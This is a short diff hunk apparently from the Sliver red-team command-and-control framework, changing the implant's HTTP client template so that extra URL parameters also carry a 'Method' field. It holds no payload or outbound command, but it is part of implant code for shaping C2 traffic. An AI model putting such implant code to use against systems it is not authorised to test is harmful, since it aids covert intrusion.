@@ -273,7 +273,12 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 
 	extraURLParams := []nameValueProbability{
 		// {{range $param := .HTTPC2ImplantConfig.ExtraURLParameters}}
-		{Name: "{{$param.Name}}", Value: "{{$param.Value}}", Probability: "{{$param.Probability}}"},
+		{
+			Name:        "{{$param.Name}}",
+			Value:       "{{$param.Value}}",
+			Probability: "{{$param.Probability}}",
+			Method:      "{{$param.Method}}",
+		},
 		// {{end}}
 	}
 	queryParams := req.URL.Query()
